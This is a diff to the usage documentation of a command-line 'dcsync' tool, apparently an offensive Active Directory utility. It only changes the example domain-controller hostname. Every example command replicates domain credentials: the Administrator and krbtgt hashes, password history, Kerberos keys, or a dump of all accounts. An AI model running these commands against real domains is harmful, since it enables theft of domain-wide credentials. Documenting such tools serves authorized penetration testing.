@@ -14,85 +14,85 @@
 **Replicate specific accounts by name (comma-separated):**
 
 ```bash
-./dcsync [auth_flags] --dc dc01.example.com -n Administrator,krbtgt
+./dcsync [auth_flags] --dc dc01.domain.local -n Administrator,krbtgt
 ```
 
 **Replicate accounts listed in a file:**
 
 ```bash
-./dcsync [auth_flags] --dc dc01.example.com -N targets.txt
+./dcsync [auth_flags] --dc dc01.domain.local -N targets.txt
 ```
 
 **Replicate a single object by GUID:**
 
 ```bash
-./dcsync [auth_flags] --dc dc01.example.com -g a1b2c3d4-e5f6-7890-abcd-ef1234567890
+./dcsync [auth_flags] --dc dc01.domain.local -g a1b2c3d4-e5f6-7890-abcd-ef1234567890
 ```
 
 **Replicate a single object by SID:**
 
 ```bash
-./dcsync [auth_flags] --dc dc01.example.com -s S-1-5-21-111-222-333-502
+./dcsync [auth_flags] --dc dc01.domain.local -s S-1-5-21-111-222-333-502
 ```
 
 **Replicate objects whose SIDs are listed in a file:**
 
 ```bash
-./dcsync [auth_flags] --dc dc01.example.com -S sids.txt
+./dcsync [auth_flags] --dc dc01.domain.local -S sids.txt
 ```
 
 **Replicate objects matching an LDAP filter:**
 
 ```bash
-./dcsync [auth_flags] --dc dc01.example.com -q '(userAccountControl:1.2.840.113556.1.4.803:=512)'
+./dcsync [auth_flags] --dc dc01.domain.local -q '(userAccountControl:1.2.840.113556.1.4.803:=512)'
 ```
 
 **Replicate all objects in batches of 1000:**
 
 ```bash
-./dcsync [auth_flags] --dc dc01.example.com -a -M 1000
+./dcsync [auth_flags] --dc dc01.domain.local -a -M 1000
 ```
 
 **Include password history for a specific account:**
 
 ```bash
-./dcsync [auth_flags] --dc dc01.example.com -n Administrator --history
+./dcsync [auth_flags] --dc dc01.domain.local -n Administrator --history
 ```
 
 **Include all supported Kerberos encryption key types:**
 
 ```bash
-./dcsync [auth_flags] --dc dc01.example.com -n Administrator --all-keytypes
+./dcsync [auth_flags] --dc dc01.domain.local -n Administrator --all-keytypes
 ```
 
 **Dump all accounts with account status and password-last-set metadata:**
 
 ```bash
-./dcsync [auth_flags] --dc dc01.example.com -a --user-status --pwd-last-set
+./dcsync [auth_flags] --dc dc01.domain.local -a --user-status --pwd-last-set
 ```
 
 **Dump all accounts, omitting LM hashes:**
 
 ```bash
-./dcsync [auth_flags] --dc dc01.example.com -a --no-lm
+./dcsync [auth_flags] --dc dc01.domain.local -a --no-lm
 ```
 
 **Write output to a directory:**
 
 ```bash
-./dcsync [auth_flags] --dc dc01.example.com -a -o /tmp/dump
+./dcsync [auth_flags] --dc dc01.domain.local -a -o /tmp/dump
 ```
 
 **Write output to the default output directory:**
 
 ```bash
-./dcsync [auth_flags] --dc dc01.example.com -a -O
+./dcsync [auth_flags] --dc dc01.domain.local -a -O
 ```
 
 **Resume a previously interrupted dump from a checkpoint file:**
 
 ```bash
-./dcsync [auth_flags] --dc dc01.example.com -a --resume-file output/example.local_1234567890.resume
+./dcsync [auth_flags] --dc dc01.domain.local -a --resume-file output/DOMAIN.LOCAL_1234567890.resume
 ```
 
 ## Notes
